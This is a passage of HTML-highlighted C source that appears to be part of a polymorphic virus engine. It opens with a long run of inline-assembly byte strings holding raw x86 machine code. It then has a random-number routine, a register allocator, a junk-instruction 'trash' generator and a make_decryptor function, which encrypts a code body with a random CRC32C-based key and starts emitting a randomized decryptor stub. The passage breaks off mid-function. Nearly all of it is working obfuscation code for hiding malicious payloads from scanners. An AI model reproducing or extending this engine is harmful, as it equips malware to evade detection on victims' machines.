asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x13,0xB8,0x02,0x00,0x00,0x00,0xE8,0x93,0x03,0x00,0x00,0x89,0x45,0xFC,0xC1,0xE0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x03,0x89,0x45,0xF8,0xB8,0x02,0x00,0x00,0x00,0xE8,0x80,0x03,0x00,0x00,0x89,0x45&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xDC,0xD1,0xE0,0x89,0x45,0xD8,0xC1,0xE0,0x02,0x89,0x45,0xD4,0xB8,0x04,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0xE8,0x68,0x03,0x00,0x00,0xC1,0xE0,0x03,0x89,0x45,0xD0,0xE8,0x70,0x03,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0xC1,0xE0,0x03,0x89,0x45,0xCC,0xE8,0x70,0x03,0x00,0x00,0x89,0x45,0xF4,0xC1&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE0,0x03,0x89,0x45,0xE4,0xE8,0x62,0x03,0x00,0x00,0x89,0x45,0xEC,0xE8,0x5F,0x03&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0x89,0x45,0xF0,0xC1,0xE0,0x03,0x89,0x45,0xE0,0xE8,0x51,0x03,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x89,0x45,0xE8,0xE8,0x4E,0x03,0x00,0x00,0x89,0x45,0xB8,0xC1,0xE0,0x03,0x89,0x45&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xB4,0xE8,0x40,0x03,0x00,0x00,0x89,0x45,0xB0,0xB8,0x1F,0x00,0x00,0x00,0xE8,0x0B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x03,0x00,0x00,0x96,0x46,0x8B,0x55,0x0C,0x8B,0x45,0xFC,0xD1,0xEA,0x73,0x0E,0x4E&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0F,0x84,0x27,0x01,0x00,0x00,0x4E,0x0F,0x84,0x2D,0x01,0x00,0x00,0xD1,0xEA,0x73&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0E,0x4E,0x0F,0x84,0x2F,0x01,0x00,0x00,0x4E,0x0F,0x84,0x36,0x01,0x00,0x00,0xD1&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xEA,0x73,0x07,0x4E,0x0F,0x84,0x32,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x84,0x47,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0x41,0x01,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84,0x44,0x01,0x00,0x00,0x4E,0x0F,0x84,0x45,0x01&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84,0x42,0x01,0x00,0x00,0x4E,0x0F,0x84&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x4C,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84,0x59,0x01,0x00,0x00,0x4E&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0F,0x84,0x5F,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0x5E,0x01,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0x60,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x4E,0x0F,0x84,0x62,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84,0x65,0x01&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0x4E,0x0F,0x84,0x6E,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E,0x0F,0x84&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x70,0x01,0x00,0x00,0x4E,0x0F,0x84,0x79,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0F,0x84,0x7F,0x01,0x00,0x00,0x4E,0x0F,0x84,0x97,0x01,0x00,0x00,0xD1,0xEA,0x73&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x07,0x4E,0x0F,0x84,0xA4,0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0xA0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x01,0x00,0x00,0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0xA3,0x01,0x00,0x00,0xD1,0xEA&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x73,0x0E,0x4E,0x0F,0x84,0xA6,0x01,0x00,0x00,0x4E,0x0F,0x84,0xB0,0x01,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xD1,0xEA,0x73,0x07,0x4E,0x0F,0x84,0xB0,0x01,0x00,0x00,0xD1,0xEA,0x73,0x0E,0x4E&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0F,0x84,0xB7,0x01,0x00,0x00,0x4E,0x0F,0x84,0xB7,0x01,0x00,0x00,0xD1,0xEA,0x73&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x07,0x4E,0x0F,0x84,0xB3,0x01,0x00,0x00,0xE9,0xBC,0xFE,0xFF,0xFF,0x0C,0x88,0xAA&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xB0,0xC0,0x0B,0x45,0xE4,0x0B,0x45,0xF0,0xAA,0xC3,0x0C,0x8A,0xAA,0xB0,0xC0,0x0B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x45,0xE0,0x0B,0x45,0xF4,0xAA,0xC3,0xB0,0xB0,0x0B,0x45,0xF8,0x0B,0x45,0xF0,0xAA&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE9,0x8D,0x01,0x00,0x00,0x0C,0xC6,0xAA,0xB0,0xC0,0xEB,0xF0,0xB0,0x0F,0xAA,0xB0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xB6,0x0B,0x45,0xFC,0x0B,0x45,0xD4,0xAA,0xB0,0xC0,0x0B,0x45,0xC4,0xEB,0xD3,0x0C&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x86,0xAA,0xB0,0xC0,0x0B,0x45,0xE0,0x0B,0x45,0xE8,0xAA,0xC3,0x0C,0x86,0xAA,0xEB&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xF1,0xB0,0x8D,0xAA,0xB0,0x05,0x0B,0x45,0xC4,0xAA,0xE9,0x59,0x01,0x00,0x00,0x0C&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x0B,0x45,0xCC,0xAA,0xEB,0x99,0x0C,0x02,0x0B,0x45,0xCC,0xAA,0xEB,0x9E,0x0C&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x80,0xAA,0xB0,0xC0,0x0B,0x45,0xCC,0x0B,0x45,0xF0,0xAA,0xE9,0x32,0x01,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xF7,0x45,0x14,0x01,0x00,0x00,0x00,0x0F,0x84,0x2C,0xFE,0xFF,0xFF,0x0C,0x04,0x0B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x45,0xCC,0xAA,0xE9,0x1A,0x01,0x00,0x00,0x0C,0xFE,0xAA,0xB0,0xC0,0x0B,0x45,0xD4&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE9,0x60,0xFF,0xFF,0xFF,0xB0,0x40,0x0B,0x45,0xD4,0x0B,0x45,0xC8,0xAA,0xC3,0x0C&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xF6,0xAA,0xB0,0xD0,0x0B,0x45,0xD4,0xE9,0x49,0xFF,0xFF,0xFF,0x0C,0x84,0xAA,0xB0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC0,0x0B,0x45,0xB4,0x0B,0x45,0xB0,0xAA,0xC3,0x0C,0xF6,0xAA,0xB0,0xC0,0x0B,0x45&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xB8,0xAA,0xE9,0xDB,0x00,0x00,0x00,0xB0,0x0F,0xAA,0xB0,0xAF,0xAA,0xB0,0xC0,0x0B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x45,0xC4,0x0B,0x45,0xC0,0xAA,0xC3,0xB0,0x69,0xAA,0xE8,0xEE,0xFF,0xFF,0xFF,0xE9&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC4,0x00,0x00,0x00,0x0C,0xD0,0x0B,0x45,0xD8,0xAA,0xB0,0xC0,0x0B,0x45,0xCC,0x0B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x45,0xF0,0xAA,0xC3,0x0C,0xC0,0xAA,0xB0,0xC0,0x0B,0x45,0xCC,0x0B,0x45,0xF0,0xAA&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE9,0xAD,0x00,0x00,0x00,0xB0,0x0F,0xAA,0xB0,0xA4,0x0B,0x45,0xD4,0xAA,0xB0,0xC0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE8,0x05,0x00,0x00,0x00,0xE9,0x98,0x00,0x00,0x00,0xB0,0xC0,0x0B,0x45,0xBC,0x0B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x45,0xC8,0xAA,0xC3,0xF7,0x45,0x10,0x02,0x00,0x00,0x00,0x0F,0x84,0x78,0xFD,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xB0,0x0F,0xAA,0xB0,0xA5,0x0B,0x45,0xD4,0xAA,0xEB,0xDE,0xB0,0x0F,0xAA,0xB0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC8,0xEB,0xDC,0xB0,0x0F,0xAA,0xB0,0xC0,0x0B,0x45,0xFC,0xAA,0xE9,0xE1,0xFE,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xB0,0x0F,0xAA,0xB0,0xBC,0x0B,0x45,0xDC,0xAA,0xE9,0x6E,0xFF,0xFF,0xFF,0xB0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0F,0xAA,0xB0,0xBA,0xAA,0xB0,0xE0,0x0B,0x45,0xD0,0x0B,0x45,0xC8,0xAA,0xEB,0x42&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xB0,0x0F,0xAA,0xB0,0xA3,0x0B,0x45,0xD0,0xAA,0xEB,0x9F,0x66,0xB8,0xEB,0x01,0x66&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xAB,0xB8,0x00,0x01,0x00,0x00,0xE8,0x33,0x00,0x00,0x00,0xAA,0xC3,0xB0,0x26,0x0B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x45,0xD0,0xAA,0xC3,0xB0,0x64,0x0B,0x45,0xDC,0xAA,0xC3,0xB0,0xF2,0x0B,0x45,0xDC&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xAA,0xC3,0x83,0x7D,0xFC,0x00,0x74,0x0A,0xE8,0x00,0x00,0x00,0x00,0xE8,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0xB8,0x00,0x01,0x00,0x00,0xE8,0x02,0x00,0x00,0x00,0xAA,0xC3,0x60,0x50&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0x75,0x08,0xFF,0x55,0x28,0x83,0xC4,0x08,0x89,0x44,0x24,0x1C,0x61,0x0B,0xC0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC3,0xB8,0x08,0x00,0x00,0x00,0xE8,0xE3,0xFF,0xFF,0xFF,0xC3,0x8B,0x55,0x10,0xEB&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0D,0x8B,0x55,0x14,0xEB,0x08,0x8B,0x55,0x10,0x0B,0x55,0x14,0xEB,0x00,0xE8,0xDE&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0xFF,0x8B,0xC8,0x83,0x7D,0xFC,0x00,0x75,0x03,0x83,0xE1,0x03,0x0F,0xA3&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xCA,0x73,0xEB,0xC3&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">uint32_t</span> random<span style="color: black;">&#40;</span>globals <span style="color: #339933;">*</span>gl<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> range<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span>gl<span style="color: #339933;">-&gt;</span>seed <span style="color: #339933;">=</span> gl<span style="color: #339933;">-&gt;</span>seed <span style="color: #339933;">*</span> <span style="color: #0000dd;">214013</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">2531011</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> range<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">int</span> alloc_reg<span style="color: black;">&#40;</span><span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>mask<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> random<span style="color: black;">&#40;</span>g<span style="color: #339933;">,</span> <span style="color: #0000dd;">8</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span> <span style="color: #339933;">;</span> i <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span> <span style="color: #0000dd;">7</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span>mask <span style="color: #339933;">&amp;</span> <span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">&lt;&lt;</span> i<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
			<span style="color: #339933;">*</span>mask <span style="color: #339933;">&amp;=</span> ~<span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">&lt;&lt;</span> i<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
			<span style="color: #b1b100;">return</span> i<span style="color: #339933;">;</span>
		<span style="color: black;">&#125;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> free_reg<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> reg<span style="color: #339933;">,</span> <span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>mask<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
	<span style="color: #339933;">*</span>mask <span style="color: #339933;">|=</span> <span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span> <span style="color: #339933;">&lt;&lt;</span> reg<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>trash<span style="color: black;">&#40;</span>globals <span style="color: #339933;">*</span>gl<span style="color: #339933;">,</span> <span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>ptr<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> regfree<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> s<span style="color: #339933;">;</span>
	etg<span style="color: black;">&#40;</span>gl<span style="color: #339933;">,</span> ETG_ALL<span style="color: #339933;">-</span>ETG_SEG<span style="color: #339933;">-</span>ETG_REP<span style="color: #339933;">,</span>
		REG_ALL<span style="color: #339933;">,</span> regfree<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>s<span style="color: #339933;">,</span> <span style="color: #0000dd;">8</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">128</span><span style="color: #339933;">,</span> ptr<span style="color: #339933;">,</span> gl<span style="color: #339933;">-&gt;</span>random<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">return</span> ptr <span style="color: #339933;">+</span> s<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">int</span> make_decryptor<span style="color: black;">&#40;</span><span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>buf<span style="color: #339933;">,</span> <span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>src<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> src_va<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> src_sz<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
<span style="color: #339933;">#define	emit1(x)	*buf++ = x</span>
<span style="color: #339933;">#define emit2(x,y)	do { *buf++ = x; *buf++ = y; } while(0)</span>
<span style="color: #339933;">#define	emit4(x)	do { *(uint32_t*)buf = x; buf += 4; } while(0)</span>
	<span style="color: #993333;">uint8_t</span> free_regs <span style="color: #339933;">=</span> <span style="color: #208080;">0xcf</span><span style="color: #339933;">,</span> <span style="color: #339933;">*</span>label<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>orig_buf<span style="color: #339933;">,</span> saved_regs<span style="color: black;">&#91;</span><span style="color: #0000dd;">8</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #339933;">*</span>sz<span style="color: #339933;">;</span>
	<span style="color: #993333;">uint32_t</span> crc_reg<span style="color: #339933;">,</span> dst_reg<span style="color: #339933;">,</span> push_count<span style="color: #339933;">;</span>
&nbsp;
	<span style="color: #993333;">void</span> codegen<span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span> cmdargs<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> cmdtype<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> dst<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> src<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
		<span style="color: #993333;">int</span> s <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>
		cg<span style="color: black;">&#40;</span>g<span style="color: #339933;">,</span> buf<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>s<span style="color: #339933;">,</span> free_regs<span style="color: #339933;">,</span> NULL<span style="color: #339933;">,</span>
			cmdtype <span style="color: #339933;">==</span> cmd_cmp <span style="color: #339933;">?</span> NULL <span style="color: #339933;">:</span> <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>g<span style="color: #339933;">-&gt;</span>trash<span style="color: #339933;">,</span> g<span style="color: #339933;">-&gt;</span>random<span style="color: #339933;">,</span>
			cmdargs<span style="color: #339933;">,</span> cmdtype<span style="color: #339933;">,</span> dst<span style="color: #339933;">,</span> src<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		buf <span style="color: #339933;">+=</span> s<span style="color: #339933;">;</span>
	<span style="color: black;">&#125;</span>
&nbsp;
	orig_buf <span style="color: #339933;">=</span> buf<span style="color: #339933;">;</span>
	<span style="color: #993333;">uint32_t</span> key <span style="color: #339933;">=</span> random<span style="color: black;">&#40;</span>g<span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* encrypt body */</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">,</span> j<span style="color: #339933;">;</span>
	<span style="color: #993333;">uint32_t</span> x<span style="color: #339933;">,</span> crc <span style="color: #339933;">=</span> key<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> src_sz<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
		<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>j <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> j <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">256</span><span style="color: #339933;">;</span> j<span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
			x <span style="color: #339933;">=</span> crc32c_intel<span style="color: black;">&#40;</span>crc<span style="color: #339933;">,</span> j<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
			<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>x <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">24</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> src<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
				<span style="color: #339933;">*</span>buf<span style="color: #339933;">++</span> <span style="color: #339933;">=</span> j<span style="color: #339933;">;</span>
				crc <span style="color: #339933;">=</span> x<span style="color: #339933;">;</span>
				<span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span>
			<span style="color: black;">&#125;</span>
		<span style="color: black;">&#125;</span>
	<span style="color: black;">&#125;</span>
	sz <span style="color: #339933;">=</span> buf<span style="color: #339933;">;</span>
	emit4<span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">#ifdef	DEBUG</span>
	emit4<span style="color: black;">&#40;</span><span style="color: #208080;">0x90909090</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	emit4<span style="color: black;">&#40;</span><span style="color: #208080;">0x90909090</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">#endif</span>
	<span style="color: #808080; font-style: italic;">/* save regs */</span>
	push_count <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>random<span style="color: black;">&#40;</span>g<span style="color: #339933;">,</span> <span style="color: #0000dd;">8</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">7</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
		emit1<span style="color: black;">&#40;</span><span style="color: #208080;">0x60</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		push_count<span style="color: #339933;">--;</span>
	<span style="color: black;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span>
		<span style="color: #993333;">uint8_t</span> reg<span style="color: #339933;">,</span> mask <span style="color: #339933;">=</span> ~<span style="color: black;">&#40;</span>REG_ESP <span style="color: #339933;">|</span> REG_EAX <span style="color: #339933;">|</span> REG_ECX<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		<span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>mask <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
			reg <span style="color: #339933;">=</span> alloc_reg<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>mask<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
			emit1<span style="color: black;">&#40;</span><span style="color: #208080;">0x50</span> <span style="color: #339933;">|</span> reg<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
